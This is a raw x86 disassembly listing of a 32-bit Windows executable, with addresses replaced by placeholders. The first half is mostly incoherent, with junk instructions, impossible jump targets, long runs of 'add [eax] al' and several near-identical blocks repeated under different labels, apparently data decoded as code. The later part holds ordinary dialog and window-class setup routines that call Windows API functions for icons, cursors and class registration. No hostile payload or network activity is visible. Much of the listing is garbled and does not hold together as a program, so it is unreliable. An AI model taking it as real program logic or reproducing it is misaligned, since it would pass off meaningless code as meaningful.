add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f40c
ja r-xdata
jmp 0xffffffffe7288a55
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288a05
jno r-xdata
jno 0xffffffffff13ba35
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c149bf
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba5aa
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b566
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4033a3
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_4033a3
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_4033db
jne 0xffffffffa3a51a4e
push esi
push esi
pushfd
call sub_4033cc
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ ecx + 0x34 ] ch
inc eax
add [ ebx + 0x57704ec ] al
jmp 0xffffffff894f3a63
sub_4033db
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3a63
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864d902
mov ecx 0x850fef7f
push ebp
call sub_4033ff
jns 0xffffffffc2c13d69
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_403422
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40341a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f8ee
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403453
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x8c ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_40362c
retn 0x10
sub_40341a
push ebx
push eax
call sub_403422
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40341a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f8ee
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403453
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x8c ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_40362c
retn 0x10
sub_403422
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_40341a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8288781
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104f8ee
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403453
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x74 ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
xor edx edx
sub edx [ ebp - 0x44 ]
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x70 ] 0x400
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x14
push ecx
call [ ebp - 0x88 ]
mov [ ebp - 0x74 ] eax
lea edx [ ebp + 0x8c ]
shr edx 0x4
mov [ ebp - 0x8c ] edx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_40362c
retn 0x10
sub_4035a1
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846a6f9
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35acfd
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
push ebp
push esp
sub esp 0x8
call sub_4035cd
jae 0x5a762447
or ecx 0x30246c81
mov [ 0xffffffffec830040 ] esi
add al 0x73
adc al [ ecx - 0x16fe8c0d ]
push ebx
jmp 0xffffffff83948b14
push edx
push ebp
sub esp 0xc
call sub_4035f2
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
xor [ esi ] 0xec830040
add al 0x75
add eax 0xf0671e9
lea esi [ edi + 0xa ]
je r--data
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864a259
add [ eax ] al
je 0xffffffff8400249a
add al [ ebx + 0x77d04ec ]
les ebp [ eax - 0x3d ]
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_403646
jpo 0x59283bbc
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aab9a
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918aab
mov [ ebx + 0x248246c ] es
add cl [ edi ]
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
call sub_403661
mov esp 0x890f0573
sub_4035cd
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864a259
push edx
push ebp
sub esp 0xc
call sub_4035f2
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
xor [ esi ] 0xec830040
add al 0x75
add eax 0xf0671e9
lea esi [ edi + 0xa ]
je r--data
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
add [ eax ] al
je 0xffffffff8400249a
les ebp [ eax - 0x3d ]
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_403646
jpo 0x59283bbc
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aab9a
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918aab
sub esp 0x4
jge r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
call sub_403661
mov esp 0x890f0573
sub_4035f2
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc38b39
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f3c7c
add [ eax ] al
jg r-xdata
je r--data
les ebp [ eax - 0x3d ]
jno r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_403646
jpo 0x59283bbc
mov edi 0xc368c483
jne r-xdata
je 0xffffffff8400249a
push ebx
call sub_40361a
jge 0xffffffff844f4086
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aab9a
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918aab
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
call sub_403661
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
xor [ esi ] 0xec830040
add al 0x75
add eax 0xf0671e9
lea esi [ edi + 0xa ]
push edx
push ebp
sub esp 0xc
call sub_4035f2
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_40362c
sub esp 0x4
push esi
push esp
push esi
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aab9a
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918aab
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
call sub_403661
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_4035f2
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
xor [ esi ] 0xec830040
add al 0x75
add eax 0xf0671e9
lea esi [ edi + 0xa ]
je r--data
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add [ eax ] al
je 0xffffffff8400249a
push eax
push ecx
call sub_403646
jpo 0x59283bbc
les ebp [ eax - 0x3d ]
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
sub_403646
pop edx
jae r-xdata
pop eax
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53918aab
pop eax
jae r-xdata
call 0xe3aab9a
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
call sub_403661
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_4035f2
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
xor [ esi ] 0xec830040
add al 0x75
add eax 0xf0671e9
lea esi [ edi + 0xa ]
je r--data
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add [ eax ] al
je 0xffffffff8400249a
les ebp [ eax - 0x3d ]
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_403646
jpo 0x59283bbc
jne r-xdata
sub_403661
jae r-xdata
pop edx
jns 0x5b0026e0
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
jns r-xdata
sub_4036b0
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401580
push [ eax + 0x4 ]
push [ eax ]
call sub_410961
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_4036f0
push ebp
mov ebp esp
push 0xffffffff
push sub_41d77a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_4036e0
push 0x7e0
mov [ ebp - 0x4 ] 0x0
call sub_40a861
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_401260
jmp r-xdata
push 0x1
push 0x1d7fb
push rw-data
mov ecx eax
mov [ ebp - 0x4 ] 0x0
call sub_401280
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_403780
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
sub eax 0x1
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
cmp ax 0x1
je r-xdata
movzx eax ax
push eax
push [ ebp + 0x8 ]
call [ EndDialog@IAT ]
cmp ax 0x2
jne r-xdata
sub_4037c0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
push ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x18 ] eax
call [ GetDC@IAT ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x24 ] eax
je r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea edi [ esi * 8 + rw-data ]
push edi
push esi
push rw-data
mov [ ebp - 0x20 ] edi
call sub_4054a0
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x20
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov esi [ edi ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ edi ]
push ebx
push [ rw-data ]
mov ebx [ rw-data ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov edi eax
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
push rw-data
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call sub_405be0
xor eax eax
mov [ rw-data ] 0x20
cmp [ rw-data ] eax
sete al
mov [ rw-data ] eax
mov eax esi
shl eax 0x4
add eax esi
mov esi [ ebp - 0x24 ]
lea edx [ eax * 2 - 0x22 ]
mov eax edi
shl eax 0x4
add eax edi
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_404130
mov ecx [ ebp - 0x1c ]
shl ecx 0x4
add ecx [ ebp - 0x1c ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp - 0x18 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_404130
mov eax ebx
shl eax 0x4
add eax ebx
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x28 ]
shl eax 0x4
add eax [ ebp - 0x28 ]
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_404130
mov eax [ ebp - 0x2c ]
shl eax 0x4
add eax [ ebp - 0x2c ]
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x30 ]
shl eax 0x4
add eax [ ebp - 0x30 ]
mov [ ebp - 0x14 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_404130
mov ecx [ rw-data ]
add esp 0x2c
mov eax [ ecx * 4 + r--data ]
pop ebx
cmp [ eax * 8 + rw-data ] 0x0
jne r-xdata
mov [ eax * 8 + rw-data ] 0x0
cmp [ rw-data ] ecx
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
push [ rw-data ]
mov esi [ SetCursor@IAT ]
call esi
push [ ebp - 0x34 ]
call sub_404320
add esp 0x4
push [ rw-data ]
call esi
sub_403a30
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push 0x84
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_404690
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] eax
call [ LoadIconW@IAT ]
push 0x84
push [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rw-data
call [ LoadIconW@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
call [ RegisterClassExW@IAT ]
mov esp ebp
pop ebp
retn
sub_403ab0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ LoadCursorW@IAT ]
push edi
push 0x83
push [ rw-data ]
mov [ ebp - 0x18 ] ebx
call esi
push 0x85
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0x84
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov esi [ LoadIconW@IAT ]
push 0x9f
push [ rw-data ]
mov [ rw-data ] eax
call esi
push 0xa0
